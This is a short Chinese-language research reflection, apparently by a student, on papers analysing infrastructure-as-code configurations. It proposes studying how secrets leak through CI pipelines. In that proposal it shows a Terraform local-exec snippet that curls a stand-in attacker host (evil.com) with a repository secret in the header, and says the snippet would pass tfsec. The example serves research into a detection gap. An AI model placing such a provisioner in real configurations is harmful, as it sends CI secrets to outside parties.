# report

## 1. reflection

我认真阅读了这几篇文章，这几篇文章采用不同的方法分析了iac配置。大体可分为基于统计的机器学习流派和基于规则的流派。首先得出的结论是，我认为之前归纳的两种模式并不适用，原因在于对于iac配置修改存在非回滚性，并且我观察到这几篇文章很少研究ci和iac配置更改的关系，因为这会增加数据获取和清洗成本（有些ci失败并非源于iac配置错误，这几篇文章数据采集都是通过简单的github commit里是否有bug之类的关键词，十分简单粗暴）。这几篇文章我最欣赏通过形式化语义从而静态分析iac vulnerability的工作。这篇文章提出的静态分析框架可以分析到运行时短暂出现的vulnerability，而tfsec类似的工具完全无法做到这点。我在本科阶段学过自动机理论，简单的dafny以及haskell，了解一些基本的语义，不过还是不足以让我完全理解他的实现原理。对于代码smell方面，我没有太多感悟，我觉得代码smell没有vulnerability具有实际价值，并且这方面的研究普遍都是在找实证案例，很难有创新点。总的来说，我认为我目前的学习背景不足以胜任形式化方面的研究，但个人还是倾向于基于规则的静态分析方面的研究。



## 2. potential work
经过观察，我发现这几篇文章着重点都是对于iac配置文件本身的研究，但在实际开发中iac配置文件往往和cicd相结合。单纯对iac配置文件的检查难以保障secret信息在ci阶段不被泄漏。具体来说，如果某个没有devops权限的开发者想知道该仓库的隐私变量，只需要：
```bash
provisioner "local-exec" {
  command = "curl -H 'Authorization: Bearer ${var.secret}' https://evil.com/upload"
}
```
会通过tfsec检验，但当github action执行ci时，由于secret是配置在github repo的，此时会把secret泄漏出去，造成风险。类似的泄漏还有不少，但需要更多时间去验证。目前的两个问题是：

- 1. 此类发现的研究和落地价值：目前很多大公司对pull request采取严格的人工审查策略，像这种错误即使自动化分析软件无法发现，人工也能检查出来，可能落地价值不高。
  2. 如何跟静态分析相结合？我缺乏相关背景，所以尚不清楚怎么结合。


另外，针对有些文章的粗暴数据采集，我认为还有一个潜在的任务是把每个commit和github相关的issue或者pr request的信息结合起来，这样的数据采集可能会挖掘到更多信息。
